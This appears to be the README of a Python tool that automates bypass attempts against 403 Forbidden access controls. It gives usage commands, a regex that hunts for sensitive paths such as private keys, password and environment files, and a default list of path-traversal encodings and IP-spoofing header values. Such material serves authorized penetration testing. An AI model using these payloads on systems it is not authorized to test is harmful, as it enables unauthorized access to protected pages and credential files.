<!--README.md-->

<div align="center">
<img style="height: 50" src="logo.svg">
<p>v1.0.0</p>
</div>

A powerful Python-based tool to automate 403 Forbidden bypass techniques for bug bounty hunters, penetration testers, and security researchers. `v1.0.0` perform **`229`** tests.

[![Prerequisites](https://img.shields.io/badge/Prerequisites-Python%203-blue)](https://www.python.org/downloads/)
<hr>

**Installation:**

```yaml
pip install 403
```
**Usage:**
```bash
cat urls.txt | grep -Ei '(\/(admin|administrator|wp-admin|login|backend|console|cpanel|controlpanel|private|secret|secure|confidential|keys|ssh|certs|database|db|config|settings|\.git|\.svn|\.htaccess|\.htpasswd|passwd|shadow|id_rsa|id_dsa|access\.log|error\.log|backup|old|env|backup|bak|save|swp|orig|tmp|temp|copy|bkp|etc\/passwd))([/?]|$)|\.(bak|backup|old|save|swp|orig|tmp|temp|copy|bkp|env|config|cfg|ini|php|json|xml|yml|conf|settings|log|logs|pem|key|cer|crt|pfx|p12|der|jks|keystore|truststore|sql|db|sqlite|sqlite3|mdb|dbf|mdf|ldb|sdf|db3|dmp|gitignore|~)([?/]|$)' | httpx -mc 403 -silent | 403
```
```yaml
403 -t https://example.com/secret
```
```yaml
403 -t targets.txt
```
```bash
403 -t https://site.com/hidden \
  -x POST \
  -H "X-Forwarded-For: 127.0.0.1" "X-Auth: bypass" \
  -p "/%2e/" "/..;/admin" \
  --port 8080
```
<p align="center"><b>Advance Options</b></p>

<div align="center">
<table>
  <thead>
    <tr>
      <th>Option</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>-x</code></td>
      <td>Custom HTTP method (default: GET)</td>
    </tr>
    <tr>
      <td><code>-H</code></td>
      <td>Custom headers (<code>Header: Value</code>)</td>
    </tr>
    <tr>
      <td><code>-p</code></td>
      <td>Custom path payloads</td>
    </tr>
    <tr>
      <td><code>-port</code></td>
      <td>Custom port (e.g., <code>8080</code>, <code>1337</code>)</td>
    </tr>
    <tr>
      <td><code>-proxy</code></td>
      <td>Use proxy (e.g., <code>socks5://127.0.0.1:9050</code>)</td>
    </tr>
    <tr>
      <td><code>-vct</code></td>
      <td>View content type (Helps filter false positive in API Testing)</td>
    </tr>
    <tr>
      <td><code>-vcl</code></td>
      <td>View content length Helps filter false positive</td>
    </tr>
    <tr>
      <td><code>-up</code></td>
      <td>Update <code>403</code></td>
    </tr>
    <tr>
      <td><code>-h / -help</code></td>
      <td>Help message</td>
    </tr>
  </tbody>
</table>
</div>

**Features:**
- Tecniqes:
  - Path manipulation attacks (`%2e`, `%00`, duplicate slashes, etc.)
  - Header overrides (`X-Original-URL`, `X-Rewrite-URL`, etc.)
  - IP spoofing via headers (`X-Forwarded-For`, `X-Real-IP`, etc.)
  - HTTP method override (`GET`, `POST`, `PUT`, `TRACE`, `PATCH`, etc.)
  - HTTP Downgrade (`HTTP/0.9`) requests
  - Malformed `Content-Length` testing
  - Race condition in paths (`/secret/secret`)
  - Mid-path wildcards (`/ad*min`)
  - Null byte termination (`%00`)
  - Unicode homoglyph attacks
  - URL encoding
  - URL Case Variation (e.g. `web.config` to `Web.cOnfig`)
  - Carriage return
  - HTTP pipelining
- Custom headers, methods, payloads, and port support
- **Color-coded output:**
  - 🟩 200s (Green)
  - 🟥 400s (Red)
  - 🟨 500s (Yellow)
  - 🟦 Others (Blue)
- Standard input support
- Proxy support (`127.0.0.1:9050`)

<h2 align="center">DEV DOC</h2>

You can add more payloads without changing code `/res`

```yaml
├── res
│   ├── config.yaml
```
**Default Configuration:**
```yaml
path_payloads:
  - "/%2e/"
  - "/..;/"
  - "/%20"
  - "/%09"
  - "/%00"
  - ".json"
  - ".css"
  - ".html"
  - "?"
  - "??"
  - "???"
  - "?testparam"
  - "#"
  - "#test"
  - "/."
  - "//"
  - "/././"
  - "/..%2f"
  - "/.%2e/"
  - "/%2e%2e/"
  - "/..%00/"
  - "/%2e%2e%2f"
  - "/..%c0%af"
  - "/..%e0%80%af"
  - "/..\\"
  - "/...//"
  - "/....//"

override_headers:
  X-Original-URL: "{}"
  X-Rewrite-URL: "{}"

ip_bypass_headers:
  - "X-Custom-IP-Authorization"
  - "X-Forwarded-For"
  - "X-Forward-For"
  - "X-Remote-IP"
  - "X-Originating-IP"
  - "X-Remote-Addr"
  - "X-Client-IP"
  - "X-Real-IP"

ip_values:
  - "localhost"
  - "localhost:80"
  - "localhost:443"
  - "127.0.0.1"
  - "127.0.0.1:80"
  - "127.0.0.1:443"
  - "2130706433"
  - "0x7F000001"
  - "0177.0000.0000.0001"
  - "0"
  - "127.1"
  - "10.0.0.0"
  - "10.0.0.1"
  - "172.16.0.0"
  - "172.16.0.1"
  - "192.168.1.0"
  - "192.168.1.1"

techniques:
  path: "Path manipulation"
  header_override: "Header override"
  ip_spoofing: "IP spoofing via headers"
  content_length: "Content-Length manipulation"
  http_0_9: "HTTP/0.9 downgrade"
  race_condition: "Path race condition"
```